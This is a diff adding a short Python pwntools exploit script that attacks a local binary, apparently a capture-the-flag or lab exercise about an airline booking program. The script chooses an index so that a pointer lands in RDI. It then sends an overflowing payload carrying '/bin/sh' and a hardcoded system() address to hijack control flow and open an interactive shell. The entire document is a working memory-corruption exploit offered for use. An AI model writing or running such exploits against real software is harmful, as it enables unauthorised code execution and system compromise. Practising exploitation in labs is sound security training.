@@ -1,0 +1,25 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+target = process("./bin/ex1")
+
+line = target.recvline().decode().strip()
+print(f"Received line: {line}")
+
+input_index = 0
+target.sendline(str(input_index).encode()) # Index 0, the call of is_booked will put the address of airlines[input_index] into RDI and we will use that for the call to system
+
+# consume menu lines
+for _ in range(5):
+    print(target.recvline().decode().strip())
+
+system_address = 0x7ffff7c4b980
+
+payload = b"alin"
+
+# payload = (b"F" * 63 + b"\x00") + (b"/bin/sh\x00" +  b"F" * 56)  + b"F" * 3 * 64 + b"F" * 24 + p64(0x7ffff7c783d0, "little")
+payload = (b"F" * 63 + b"\x00") + (b"/bin/sh\x00" +  b"F" * 56)  + b"F" * 3 * 64 + b"F" * 24 + p64(system_address, "little")
+
+target.sendline(payload)
+target.interactive()
